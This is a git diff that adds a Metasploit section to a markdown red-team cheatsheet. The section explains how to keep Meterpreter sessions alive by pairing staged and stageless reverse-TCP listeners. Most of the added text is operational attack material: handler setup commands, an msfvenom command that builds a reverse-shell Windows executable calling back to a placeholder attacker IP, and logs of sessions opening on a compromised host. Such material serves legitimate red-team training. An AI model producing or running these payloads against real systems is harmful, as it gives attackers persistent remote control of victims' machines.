@@ -1,5 +1,7 @@
 # Red team
 
+> Lots of things in this cheatsheet are taken from the great [Red Team Ops](https://training.zeropointsecurity.co.uk/courses/red-team-ops) course from ZeroPointZecurity
+
 ## C2
 
 ## Staged vs stageless handler
@@ -36,6 +38,135 @@ Create a payload:
 - Windows Stager Payload: a pre-compiled stager as an EXE, Service EXE or DLL
 - Windows Stageless Payload: a pre-compiled stageless payload as an EXE, Service EXE, DLL, shellcode, as well as PowerShell.  This is also the only means of generating payloads for P2P listeners.
 - Windows Stageless Generate All Payloads: every stageless payload variant, for every listener, in x86 and x64.
+
+### Metasploit
+
+#### TCP Payloads
+
+**TCP connection workaround**
+
+Create a stageless listener:
+```
+msf exploit(handler) > set payload windows/meterpreter_reverse_tcp
+payload => windows/meterpreter_reverse_tcp
+msf exploit(handler) > set LHOST <attacker's IP>
+LHOST => <attacker's IP>
+msf exploit(handler) > set LPORT <backup port>
+LPORT => <backup port>
+msf exploit(handler) > set ExitOnSession false
+ExitOnSession => false
+msf exploit(handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter_reverse_tcp):
+
+   Name        Current Setting  Required  Description
+   ----        ---------------  --------  -----------
+   EXITFUNC    process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   EXTENSIONS                   no        Comma-separate list of extensions to load
+   EXTINIT                      no        Initialization strings for extensions
+   LHOST       <attacker's IP>       yes       The listen address
+   LPORT       <backup port>             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+msf exploit(handler) > run -j
+[*] Exploit running as background job.
+
+[*] [2016.10.05-12:25:23] Started reverse TCP handler on <attacker IP>:<backup port>
+msf exploit(handler) > [*] [2016.10.05-12:25:23] Starting the payload handler...
+```
+
+Create a matching payload for this listener:
+
+```
+$ msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker IP> LPORT=<backup port> -f exe -o /tmp/stageless.exe
+```
+
+Create a staged listener with `LPORT` set to `<backup port>` and `ReverseListenerBindPort` to something different.
+
+```
+msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(handler) > set ReverseListenerBindPort <initial port>
+ReverseListenerBindPort => <initial port>
+msf exploit(handler) > options
+
+Module options (exploit/multi/handler):
+
+Name  Current Setting  Required  Description
+----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+Name      Current Setting  Required  Description
+----      ---------------  --------  -----------
+EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+LHOST     <attacker IP>    yes       The listen address
+LPORT     <backup port>    yes       The listen port
+
+
+Exploit target:
+
+Id  Name
+--  ----
+0   Wildcard Target
+
+
+msf exploit(handler) > run -j
+[*] Exploit running as background job.
+
+[*] [2016.10.05-12:29:48] Started reverse TCP handler on <attacker IP>:<initial port>
+msf exploit(handler) > [*] [2016.10.05-12:29:48] Starting the payload handler...
+```
+
+Create a second payload for this listener, using `<initial port>` for `LPORT`.
+
+When the staged payload runs, it will connect to Metasploit on port `initial port`. If the session needs to reconnect for any reason, Meterpreter will be responsible for that reconnection. Therefore, the configuration block will be referenced instead of the stager configuration, and it will use port `<backup port>` where the stageless listener is active. Here’s an example:
+
+```
+msf exploit(handler) >
+[*] [2016.10.05-12:34:27] Sending stage (957999 bytes) to <compromised machine's IP>
+[*] Meterpreter session 1 opened (<attacker's IP>:<initial port> -> <compromised machine's IP>:<compromised machine's port>) at 2016-10-05 12:34:29 +1000
+msf exploit(handler) > sessions
+
+Active sessions
+===============
+
+  Id  Type                   Information                           Connection
+  --  ----                   -----------                           ----------
+  1   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  <attacker IP>:<initial port -> <compromised machine's IP>:<compromised machine's port> (<compromised machine's IP>)
+meterpreter > sleep 5
+[*] Telling the target instance to sleep for 5 seconds ...
+[+] Target instance has gone to sleep, terminating current session.
+
+[*] <compromised machine's IP> - Meterpreter session 1 closed.  Reason: User exit
+msf exploit(handler) > [*] Meterpreter session 2 opened (<attacker's IP>:<backup port> -> <compromised machine's IP>:<compromised machine's port>) at 2016-10-05 12:35:55 +1000
+
+msf exploit(handler) > sessions
+
+Active sessions
+===============
+
+  Id  Type                   Information                           Connection
+  --  ----                   -----------                           ----------
+  2   meterpreter x86/win32  WIN-7CH5RT177BA\oj @ WIN-7CH5RT177BA  <attacker's IP>:<backup port> -> <compromised machine's IP>:<compromised machine's port> (<compromised machine's IP>)
+```
+
+#### HTPP/S payloads
+
+For HTTP/S payloads they will automatically reconnect to the listener after a lost of connection wheither they are staged or not.
 
 ## DNS
 
